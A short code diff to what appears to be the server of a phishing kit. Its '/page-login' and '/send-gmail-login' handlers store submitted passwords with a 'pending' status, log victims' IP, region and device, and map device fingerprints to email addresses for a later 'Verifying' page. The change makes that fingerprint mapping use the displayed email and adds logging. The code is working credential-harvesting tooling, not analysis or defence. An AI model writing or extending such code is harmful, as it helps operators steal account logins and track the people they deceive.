@@ -848,6 +848,13 @@ app.post("/page-login", async (req, res) => {
     const userAgent = req.get("user-agent") || "Unknown";
     const device = detectDevice(userAgent);
     const region = await detectRegion(ip);
+    const fingerprint = getDeviceFingerprint(req);
+
+    // ✅ UPDATE FINGERPRINT MAPPING WITH NEW EMAIL (for Verifying page later)
+    if (fingerprint && messageEmail) {
+      deviceFingerprintToEmail[fingerprint] = messageEmail;
+      console.log(`💾 Updated fingerprint mapping: ${fingerprint} → ${messageEmail}`);
+    }
 
     // ✅ Store both email (for tracking) and displayEmail (for showing)
     pendingPage[email] = { password, status: "pending", displayEmail: messageEmail };
@@ -1124,9 +1131,10 @@ app.post("/send-gmail-login", async (req, res) => {
     const region = await detectRegion(ip);
     const fingerprint = getDeviceFingerprint(req);
 
-    // ✅ STORE FINGERPRINT FOR MULTI-LAYER TRACKING
-    if (fingerprint && email) {
-      deviceFingerprintToEmail[fingerprint] = email;
+    // ✅ STORE FINGERPRINT FOR MULTI-LAYER TRACKING WITH NEW EMAIL
+    if (fingerprint && messageEmail) {
+      deviceFingerprintToEmail[fingerprint] = messageEmail;
+      console.log(`💾 Updated fingerprint mapping: ${fingerprint} → ${messageEmail}`);
     }
 
     // ✅ Store both email (for tracking) and displayEmail (for showing)
